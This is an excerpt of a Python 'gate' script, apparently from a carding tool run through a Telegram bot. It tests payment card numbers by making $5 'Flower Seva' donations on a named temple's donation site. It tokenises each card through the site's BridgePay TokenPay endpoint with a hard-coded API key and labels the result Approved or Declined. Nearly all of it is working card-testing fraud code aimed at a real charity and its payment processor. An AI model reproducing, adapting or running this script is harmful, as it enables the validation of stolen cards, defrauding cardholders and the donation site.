# Pure gate motor for 'ts' — no Telegram-bot dependency.
    ...
    for _ in range(3):
        try:
            ...
            if not price_id:
                ...
                continue
            hdrs = {'User-Agent': ua, 'Accept': '*/*', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Origin': 'https://sreedevipeetham.org', 'Referer': 'https://sreedevipeetham.org/donations'}
            data = f'ids%5B%5D={price_id}&totalPrice=5&qty%5B%5D=1&ctg%5B%5D=DONATIONS&serviceTypes%5B%5D=GENERAL+DONATIONS&serviceName%5B%5D=Flower+Seva&serviceAmount%5B%5D=5.00&cart_type=DONATIONS&image%5B%5D=%2Fuploads%2Fprofile%2Fimage-1743574229065-48347557.png&description%5B%5D=&cart_ctg%5B%5D=DONATIONS&service_desc%5B%5D=&isTextinputBox%5B%5D='
            ...
            thdrs = {'X-Sending-Script': 'https://www.bridgepaynetsecuretx.com/Bridgepay.WebSecurity/TokenPay/js/tokenPay.js', 'X-Tokenpay-Key': 'tokenpay35574api20252007022038330', 'X-Requested-With': 'XMLHttpRequest', 'User-Agent': ua, 'Accept': '*/*', 'Content-Type': 'application/json', 'Origin': 'https://www.bridgepaynetsecuretx.com', 'Referer': 'https://www.bridgepaynetsecuretx.com/WebSecurity/TokenPay/js/dataValidator.html'}
            r4 = sess.post('https://www.bridgepaynetsecuretx.com/WebSecurity/TokenPayHandler.ashx', headers=thdrs, json={'number': num, 'expMonth': mes, 'expYear': ano, 'zipcode': ''}, timeout=20)
            token = _found(r4.text, '"token":"', '"')
            if not token:
                return {'status': False, 'raise': 'No BridgePay token'}
            data = f'token={token}&totolAmt=5&name={fn}+{ln}&address={st}&zipcode=10080&general_donation=0&acharya_sambhavana=0'
            ...
            return {'status': True, 'success': ok, 'response': f"{('Approved ✅' if ok else 'Declined ❌')} | {msg[:120]}"}
